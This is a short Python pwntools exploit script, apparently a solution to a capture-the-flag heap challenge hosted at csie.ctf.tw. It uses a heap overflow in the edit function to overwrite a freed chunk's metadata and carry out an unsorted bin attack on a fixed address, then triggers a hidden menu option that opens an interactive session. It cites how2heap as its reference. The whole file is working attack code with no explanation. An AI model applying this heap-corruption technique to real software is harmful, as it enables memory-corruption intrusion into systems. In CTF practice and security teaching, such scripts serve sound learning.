from pwn import *

def create(size,cont):
    r.sendlineafter('choice :','1')
    r.sendlineafter('Heap : ',str(size))
    r.sendlineafter('heap:',cont)


def edit(idx,size,cont):
    r.sendlineafter('choice :','2')
    r.sendlineafter('Index :',str(idx))
    r.sendlineafter('Heap : ',str(size))
    r.sendlineafter('heap :',cont)


def delete(idx):
    r.sendlineafter('choice :','3')
    r.sendlineafter('Index :',str(idx))

def magic():
    r.sendlineafter('choice :','4869')
    r.interactive()


###Useful Address
magic_addr = 0x601340

###Start Exploit
r = remote('csie.ctf.tw',10145)


###Create block
create(0x98,'')
create(0x98,'')
create(0x98,'')
delete(1)
edit(0,0x100,b'\x00'*0x90+p64(0)+p64(0xa1)+p64(0)+p64(magic_addr-0x10))
create(0x98,'')
magic()

### Reference
# Unsorted bin attack
## https://github.com/shellphish/how2heap/blob/master/glibc_2.26/unsorted_bin_attack.c
